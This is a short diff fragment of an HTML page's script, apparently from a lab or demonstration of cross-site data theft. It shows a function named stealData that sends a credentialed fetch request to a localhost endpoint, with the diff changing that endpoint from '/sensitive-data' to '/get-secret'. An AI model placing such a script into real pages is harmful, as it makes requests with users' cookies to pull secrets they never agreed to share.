@@ -10,7 +10,7 @@
 
     <script>
         function stealData() {
-            fetch("http://localhost:3000/sensitive-data", {
+            fetch("http://localhost:3000/get-secret", {
                 method: "GET",
                 credentials: "include"
             })
